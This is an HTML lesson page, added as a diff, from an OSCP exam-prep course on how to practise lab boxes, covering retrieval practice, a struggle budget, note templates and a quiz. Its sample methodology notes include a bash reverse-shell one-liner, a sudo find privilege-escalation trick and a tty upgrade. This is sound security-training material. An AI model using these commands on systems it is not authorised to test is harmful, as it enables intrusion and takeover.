@@ -1,0 +1,250 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Lesson 02 · How to Practice a Box</title>
+<link rel="stylesheet" href="../assets/lesson.css">
+</head>
+<body>
+
+<nav class="crumbs">OSCP Course · <a href="../reference/links.html">Links</a> · <a href="./0001-the-oscp-attack-chain.html">Lesson 01</a> · <strong>Lesson 02</strong> · <a href="../reference/glossary.html">Glossary</a></nav>
+
+<span class="kicker">Lesson 02 · Methodology</span>
+<h1>How to Practice a Box</h1>
+<p class="meta">Mission: pass the OSCP+ exam · Your win today: a repeatable practice loop + two notes artifacts, so every box builds transferable skill instead of entertainment.</p>
+
+<p class="lead">The natural first instinct is to binge walkthrough videos one after another. The honest answer is that passive watching feels productive and builds almost nothing — and <em>why</em> that's true is the most important thing to grasp before you touch a single box. This lesson gives you the loop that actually transfers to the exam, plus the two artifacts — a box-notes template and a growing methodology doc — that turn thirty scattered boxes into one repeatable method.</p>
+
+<h2>The one idea: struggle is the rep</h2>
+<p>There are two kinds of "knowing it":</p>
+<table>
+<thead><tr><th>Fluency strength</th><th>Storage strength</th></tr></thead>
+<tbody>
+<tr><td>It makes sense <em>as you watch</em></td><td>You can <em>do it cold</em>, weeks later</td></tr>
+<tr><td>Built by passive review</td><td>Built by effortful retrieval</td></tr>
+<tr><td>Feels like mastery</td><td>Actually is mastery</td></tr>
+</tbody>
+</table>
+<p>Watching a walkthrough builds fluency — a convincing illusion. The exam only rewards storage strength: a fresh box, no narrator, the clock running. Storage strength is built by <strong>effortful retrieval</strong> — trying to produce the answer yourself <em>before</em> you're shown it. The struggle isn't friction in the way of learning; the struggle <em>is</em> the learning. <span class="cite">(This is the cognitive-science principle of "desirable difficulty" — the next section unpacks the mechanism.)</span></p>
+
+<div class="box mantra">
+The dead end you fought through is worth more<br>than ten exploits you watched someone else run.
+</div>
+
+<h2>Why effortful retrieval works</h2>
+<p>This isn't motivational fluff — it's three well-studied effects, and each one maps to a habit you can schedule.<sup class="ref"><a href="#s2">2</a></sup></p>
+
+<h3>1 · The testing effect (desirable difficulty)</h3>
+<p>Trying to recall something — even <em>failing</em> to — reshapes the memory far more than re-reading ever does. Re-watching feels smooth precisely because the work is being done <em>for</em> you. The strongest encoder known is the sequence <strong>attempt → fail → see the answer</strong>: the failed attempt primes you so the correction sticks. That's the whole reason this course is attempt-first.</p>
+
+<h3>2 · Spaced repetition</h3>
+<p>Revisit a technique just as you're starting to forget it. The little jolt of "wait, how did that go again?" is the rep firing. A box you rooted and never touched again decays; the same box <strong>re-attempted a week later, cold, from memory</strong> turns a one-off into durable skill — and shows you exactly which steps you truly own versus which you only watched.</p>
+
+<h3>3 · Interleaving</h3>
+<p>Practising one type back-to-back ("blocked" practice) inflates fluency: you stop diagnosing and start running the same playbook on autopilot. Mixing types ("interleaved" practice) forces the harder, more valuable skill first — <em>deciding which method even applies</em>. A blank exam box hands you no label, so train for that: alternate Linux, Windows, and web targets instead of grinding one genre.</p>
+
+<div class="box note">
+<span class="box-title">A sample week — spacing + interleaving, no deadline</span>
+One box per practice day is plenty. The point is the <em>spacing</em> and the <em>mix</em>, not the volume:
+<ul>
+<li><strong>Mon</strong> — easy <strong>Linux</strong> box, full loop, fresh.</li>
+<li><strong>Wed</strong> — easy <strong>Windows</strong> box (a different OS stops you running Monday's muscle memory).</li>
+<li><strong>Fri</strong> — easy <strong>web-heavy</strong> box (a third genre forces you to re-diagnose).</li>
+<li><strong>Sun</strong> — <strong>re-attempt Monday's box from memory</strong>, notes closed. What you reproduce cold is what you own; what you can't goes straight into the methodology doc.</li>
+</ul>
+It feels slower than binging five web boxes in a row. It retains far better — exactly the trade you want with no deadline.
+</div>
+
+<div class="box warn">
+<span class="box-title">Signs you're building false fluency</span>
+The fluency trap is sneaky because it feels like progress. Red flags:
+<ul>
+<li>You can follow a walkthrough start to finish, but <strong>freeze on a blank box</strong> the moment the narrator is gone.</li>
+<li>You recognise the <em>genre</em> ("ah, a WordPress box") and reach for last time's exploit instead of <strong>reading this box's</strong> enumeration output.</li>
+<li>Your notes are full of flags and shell screenshots but thin on <em>"why I tried that next."</em></li>
+<li>You feel fast on retired boxes you've half-seen, and slow on anything genuinely new.</li>
+</ul>
+Two or more true? You're banking fluency, not storage. The fix is always the same: more cold attempts, more interleaving, fewer walkthroughs.
+</div>
+
+<h2>The practice loop</h2>
+<p>Run this on every box. It turns each one into a deposit into storage strength.</p>
+
+<ol class="steps">
+<li><strong>Pick one easy box.</strong> Use <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit">TJ Null's OSCP list</a> and stay in the "easy / OSCP-like" tier. Difficulty above your level just teaches frustration, not method.</li>
+<li><strong>Run the five phases yourself</strong> (<a href="./0001-the-oscp-attack-chain.html">Lesson 01</a>). Out loud, name the phase you're in: "recon… enumeration… still enumerating…". The narration keeps you honest about <em>where</em> you are.</li>
+<li><strong>Respect the struggle budget.</strong> Stuck on a single step for ~20–30 min <em>and</em> out of fresh ideas? Take <em>one</em> targeted nudge — look up that specific service on <a href="https://book.hacktricks.wiki/">HackTricks</a>, or read one hint. <em>Not</em> the full walkthrough. Then keep going.</li>
+<li><strong>Push to your real limit,</strong> then stop when you've genuinely exhausted your ideas — not at the first wall.</li>
+<li><strong>Now watch — in <span style="color:var(--accent)">review mode</span>.</strong> Open <a href="https://www.youtube.com/@ippsec">IppSec</a> or a <a href="https://0xdf.gitlab.io/">0xdf</a> write-up and compare. The question you're answering is <em>"what would have unblocked me, and how did they decide to try it?"</em> — methodology, not the exploit string.</li>
+<li><strong>Update your methodology notes.</strong> Add whatever you missed to a personal, growing checklist. This document — not any single box — is the artifact that walks into the exam with you.</li>
+</ol>
+
+<div class="box note">
+<span class="box-title">Two ways to watch IppSec — use both, in order</span>
+<strong>Learn mode</strong> (a few, early): watch 2–3 videos of <em>easy retired</em> boxes cold, purely to absorb the tooling and rhythm — what <code>nmap → gobuster → reverse shell</code> actually feels like. <strong>Review mode</strong> (the default forever after): do the box yourself first, then watch to harvest what you missed. Early on, lean learn-mode for a week; then flip hard to review-mode.
+</div>
+
+<h2>Choosing the right box</h2>
+<p>Box choice quietly decides whether a session builds method or just burns morale. Two rules: <strong>stay in the easy / OSCP-like tier</strong>, and <strong>use a curated list</strong> rather than picking by name or vibe. TJ Null's list is curated specifically for OSCP relevance — boxes whose intended paths mirror real exam vectors, not CTF party tricks. Prefer <em>retired</em> boxes that have write-ups available, so review mode actually works when you finish.</p>
+<p>Community difficulty ratings lie to beginners — an "easy" Hack The Box rating can still be brutal and rely on a leap no methodology would find. OSCP-like lists pre-filter that out. When in doubt, drop a tier; an easy box you fully own teaches more than a hard box you copy-paste through.</p>
+<p>So how do you tell a box is simply <em>above your level</em> versus appropriately hard? Watch what kind of stuck you are:</p>
+<table>
+<thead><tr><th>Right-sized — keep going</th><th>Above your level — pick easier</th></tr></thead>
+<tbody>
+<tr><td>You have hypotheses; you're stuck on <em>execution</em></td><td>You stare at the output with <em>zero</em> ideas</td></tr>
+<tr><td>Enumeration steadily reveals the next path</td><td>The path needs a concept you haven't met yet</td></tr>
+<tr><td>One targeted nudge gets you moving again</td><td>Even the nudge doesn't help — you lack the basis</td></tr>
+<tr><td>Foothold is a known service or CVE class</td><td>It hinges on a wild guess or obscure trick</td></tr>
+</tbody>
+</table>
+<p>If you're in the right-hand column, there's no shame in closing the box and grabbing an easier one. Rabbit-hole boxes built around steganography, heavy guessing, or trivia aren't OSCP-shaped — skip them and reuse the time on a box that drills the real methodology. <span class="cite">(Proving Grounds Practice and the OSCP-like TryHackMe rooms are also good, similarly curated sources.)</span></p>
+
+<h2>Your reusable box-notes template</h2>
+<p>Copy this into a note for every box. Same headings every time — the repetition is what turns scattered wins into a <em>method</em>. Over 30 boxes, the "Technique to remember" lines become the raw material for your methodology doc.</p>
+<pre><span class="c"># Box: &lt;name&gt; — &lt;platform&gt; — &lt;difficulty&gt;</span>
+<span class="c">## Recon</span>
+<span class="o">- Open ports / services (nmap output):</span>
+<span class="c">## Enumeration</span>
+<span class="o">- Per service: versions, paths, users, default creds, findings</span>
+<span class="o">- Hypotheses I'm chasing (and why):</span>
+<span class="c">## Foothold</span>
+<span class="o">- What worked, exact steps + payload:</span>
+<span class="c">## Privilege escalation</span>
+<span class="o">- Vector (SUID / sudo / service / kernel / cred reuse):</span>
+<span class="c">## Loot</span>
+<span class="o">- Creds, hashes, files harvested:</span>
+<span class="c">## Review (after the walkthrough)</span>
+<span class="o">- What I missed and why:</span>
+<span class="o">- Technique to remember next time:</span></pre>
+
+<div class="box tip">
+<span class="box-title">Interleave — don't binge one type</span>
+Doing five Linux web boxes in a row builds false fluency: you stop reading the box and start pattern-matching the genre. Mix <strong>Linux / Windows / web</strong> targets, and re-attempt an old box a week later from memory. Spacing and interleaving feel worse in the moment and retain far better — exactly the trade you want with no deadline.
+</div>
+
+<h2>Your methodology doc — the artifact that takes the exam</h2>
+<p>The box-notes are the per-box record. The <strong>methodology doc</strong> is the distilled, growing, reusable thing you build <em>from</em> those notes — and it's the real asset. After each box, promote whatever was generic ("for SMB I should always try a null session") out of the box-notes and into the doc. A good one has four living parts:</p>
+<table>
+<thead><tr><th>Section</th><th>What lives there</th></tr></thead>
+<tbody>
+<tr><td><strong>Enumeration by service</strong></td><td>A per-port checklist: port 80 → gobuster + view-source + default creds + version CVEs; 445 → enum4linux-ng + null session + readable shares; and so on</td></tr>
+<tr><td><strong>Privilege escalation</strong></td><td>An ordered checklist per OS — Linux: <code>sudo -l</code> → SUID → cron → caps → creds → kernel last; Windows: <code>whoami /priv</code> → services → AlwaysInstallElevated → creds</td></tr>
+<tr><td><strong>Techniques to remember</strong></td><td>The one-liners and gotchas that beat you once: the GTFOBins trick, the wordlist that finally worked, the reverse shell that survived the firewall</td></tr>
+<tr><td><strong>Things I always forget</strong></td><td>Your personal anti-checklist — the steps you skip under pressure (re-run nmap with <code>-p-</code>, check <code>/var/www</code> for creds)</td></tr>
+</tbody>
+</table>
+<p>Here's roughly what it looks like a few weeks in:</p>
+<pre><span class="c"># methodology.md — my growing OSCP playbook</span>
+<span class="c">## Enumeration by service</span>
+<span class="o">- 80/443:  whatweb; gobuster dir+vhost; view-source; default creds; version CVEs</span>
+<span class="o">- 139/445: enum4linux-ng; smbclient -L; smbmap; null session; readable shares</span>
+<span class="o">- 21/ftp:  anon login; get/put; banner -&gt; searchsploit</span>
+<span class="o">- 22/ssh:  reuse looted keys/creds; weak passwords last</span>
+<span class="c">## Privilege escalation</span>
+<span class="o">- Linux:   sudo -l -&gt; SUID -&gt; cron -&gt; getcap -&gt; creds/history -&gt; kernel (last)</span>
+<span class="o">- Windows: whoami /priv -&gt; service perms -&gt; AlwaysInstallElevated -&gt; creds</span>
+<span class="c">## Techniques to remember (each cost me a box once)</span>
+<span class="o">- sudo find . -exec /bin/sh \; -quit        (GTFOBins: instant root)</span>
+<span class="o">- rev shell: bash -i &gt;&amp; /dev/tcp/&lt;ip&gt;/443 0&gt;&amp;1</span>
+<span class="o">- tty upgrade: python3 -c 'import pty;pty.spawn("/bin/bash")'</span>
+<span class="c">## Things I always forget</span>
+<span class="o">- re-run nmap -p- (all ports) before giving up</span>
+<span class="o">- grep configs / history / /var/www for creds</span></pre>
+<p>Why this matters concretely: in the exam <strong>you can't use AI and you can't use Metasploit-style automation</strong> — but you <em>can</em> use your own notes. A well-organised methodology doc is your offline second brain: <code>Ctrl-F</code> a service, get your checklist, keep moving. Build it now, box by box, so on exam day it's a tool you reach for — not something you wish you'd written.</p>
+
+<h2>The struggle budget is emotional, too</h2>
+<p>Being stuck on a box <em>feels</em> like failing. It isn't — the frustration is the rep firing. That discomfort is the literal sensation of encoding, the same way burning muscles mean the set is working. The skill you're building isn't avoiding the stuck feeling; it's staying methodical <em>inside</em> it.</p>
+<p>The trap is confusing <strong>productive struggle</strong> (you have an untried hypothesis, you're testing it) with <strong>unproductive thrashing</strong> (re-running the same nmap, refreshing the page, no new idea). They feel identical from the inside, so judge by one question: <em>do I have an idea I haven't tried yet?</em></p>
+
+<div class="box tip">
+<span class="box-title">Nudge, push, or stop?</span>
+<ul>
+<li><strong>Untried hypothesis?</strong> → <em>Push.</em> The frustration is the rep — this is exactly the muscle the exam tests.</li>
+<li><strong>Out of ideas, budget not spent?</strong> → <em>Generate.</em> Re-read the box, list what you haven't enumerated yet — new hypotheses, not hints.</li>
+<li><strong>Out of ideas, budget spent (~20–30 min)?</strong> → <em>One targeted nudge,</em> then continue.</li>
+<li><strong>Thrashing even after the nudge?</strong> → <em>Stop.</em> Switch to review mode, log what you missed, and re-attempt cold in a few days (that's spacing working for you).</li>
+</ul>
+</div>
+
+<p>Resentment and fatigue actively degrade learning, so don't grind a box into the ground out of pride. Every operator you admire has sat staring at a target for an hour. Stopping with a clear head and a logged "what I missed" beats forcing a win you'll never reproduce — and tomorrow's fresh, cold re-attempt is worth more than tonight's exhausted one.</p>
+
+<h2>Check yourself</h2>
+<p>Retrieve before you reason. Feedback appears under each.</p>
+<div class="quiz" id="quiz"></div>
+
+<div class="primary">
+<span class="box-title">▶ Primary source — your review-mode toolkit</span>
+<a href="https://www.youtube.com/@ippsec">IppSec's channel</a>, searchable by technique at <a href="https://ippsec.rocks/">ippsec.rocks</a>, is the best resource in existence for <em>review-mode</em> learning — world-class methodology, explained out loud. Bookmark ippsec.rocks now: when a box beats you, search the exact technique and watch <em>only</em> that segment.<sup class="ref"><a href="#s1">1</a></sup>
+</div>
+
+<div class="box tip">
+<span class="box-title">Do this before Lesson 03</span>
+Run the loop <strong>once, end to end,</strong> on a single easy box from TJ Null's list. You don't have to root it. The deliverable isn't a flag — it's a <em>filled-in notes template</em> with at least one honest line under "What I missed," and one line promoted into your fresh methodology doc.
+</div>
+
+<div class="box note">
+<span class="box-title">Practice these boxes</span>
+<strong>Your first attempt-first box:</strong> <strong>Blue</strong> (HTB · Windows · Easy) or <strong>Twiggy</strong> (PG · Linux · Easy). Forgiving targets — practise the <em>loop</em>, not just the box. <a href="../reference/practice-boxes.html#pb-02">→ Full box map for this lesson</a>.
+</div>
+
+<div class="teacher">
+<span class="box-title">I'm your teacher — ask me anything</span>
+Want me to pair with you on a specific box, review your filled-in notes, or suggest which easy target to start on? Just ask. Next up: <strong>Lesson 03 — Service enumeration: turning open ports into a plan of attack</strong>, the phase that wins exams. (Reminder: I can't be used <em>during</em> the real exam — so we build the skill for real here.)
+</div>
+
+<h2>Sources</h2>
+<ol class="sources">
+<li id="s1"><a href="https://www.youtube.com/@ippsec">IppSec — YouTube</a> · <a href="https://ippsec.rocks/">ippsec.rocks</a> (technique-searchable walkthroughs). Box selection: <a href="https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit">TJ Null's OSCP list</a>.</li>
+<li id="s2"><a href="https://www.retrievalpractice.org/">Agarwal &amp; Bain — Retrieval Practice</a> (the evidence base for the testing effect, spacing &amp; interleaving). Popular treatment: <em>Make It Stick</em>, Brown, Roediger &amp; McDaniel.</li>
+</ol>
+
+<footer>
+<span><a href="./0001-the-oscp-attack-chain.html">← Lesson 01: The Attack Chain</a></span>
+<span><a href="./0003-service-enumeration.html">Next → Lesson 03: Service Enumeration</a></span>
+</footer>
+
+<script src="../assets/quiz.js"></script>
+<script>
+renderQuiz('quiz', [
+  {
+    prompt: "You've been stuck on one enumeration step for 25 minutes with no fresh ideas. What does the loop say to do?",
+    options: ["Open the full walkthrough", "Take one targeted nudge", "Brute-force every open port", "Restart the entire box"],
+    answer: 1,
+    explain: "Struggle budget: after ~20–30 min and out of ideas, take a single specific hint (e.g. HackTricks on that service) — not the whole solution."
+  },
+  {
+    prompt: "When should you watch the IppSec walkthrough of a box you're practising?",
+    options: ["Before you touch the box", "After your own attempt", "Instead of attempting it", "Only on real exam day"],
+    answer: 1,
+    explain: "Review mode: do it yourself first, then watch to harvest the methodology you missed."
+  },
+  {
+    prompt: "Across all the boxes you practise, what is the real transferable artifact you're building?",
+    options: ["A long list of captured flags", "Screenshots of every shell", "A big pile of saved exploits", "Your growing methodology doc"],
+    answer: 3,
+    explain: "Flags and shells are disposable; your growing methodology checklist is what walks into the exam with you."
+  },
+  {
+    prompt: "Why does struggling to recall before seeing the answer improve long-term retention?",
+    options: ["It simply wastes your time", "Videos explain it far better", "Effortful retrieval builds memory", "It lets you skip all mistakes"],
+    answer: 2,
+    explain: "Effortful retrieval (desirable difficulty) is what converts fluency into durable storage strength."
+  },
+  {
+    prompt: "To avoid building false fluency, how should you sequence the box types you practise?",
+    options: ["Interleave Linux, Windows, web", "Binge one single box type", "Repeat the same box daily", "Only ever the easiest tier"],
+    answer: 0,
+    explain: "Interleaving forces you to re-read each box instead of pattern-matching a genre — worse in the moment, better for retention."
+  },
+  {
+    prompt: "Which sign means a box is probably above your level, so you should pick an easier one?",
+    options: ["You're stuck executing a clear idea", "You have zero ideas where to go", "One nudge gets you moving", "Enumeration keeps revealing paths"],
+    answer: 1,
+    explain: "Stuck on execution with hypotheses is right-sized; zero hypotheses even after a nudge means you lack a prerequisite — drop to an easier OSCP-like box."
+  }
+]);
+</script>
+
+</body>
+</html>
